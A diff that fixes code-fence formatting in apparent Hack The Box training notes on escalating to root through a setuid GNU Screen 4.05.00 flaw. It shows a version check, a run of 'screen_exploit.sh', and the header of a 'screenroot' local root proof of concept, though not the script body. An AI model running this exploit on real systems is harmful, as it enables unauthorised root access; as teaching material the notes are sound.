@@ -6,8 +6,7 @@ Many services may be found, which have flaws that can be leveraged to escalate p
 
 #### Screen Version Identification
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ screen -v
 
 Screen version 4.05.00 (GNU) 10-Dec-16
@@ -17,8 +16,7 @@ This allows an attacker to truncate any file or create a file owned by root in a
 
 #### Privilege Escalation - Screen\_Exploit.sh
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ./screen_exploit.sh 
 
 ~ gnu/screenroot ~
@@ -37,8 +35,7 @@ The below script can be used to perform this privilege escalation attack:
 
 #### Screen\_Exploit\_POC.sh
 
-```
-        bash
+```bash
 #!/bin/bash
 # screenroot.sh
 # setuid screen v4.5.0 local root exploit
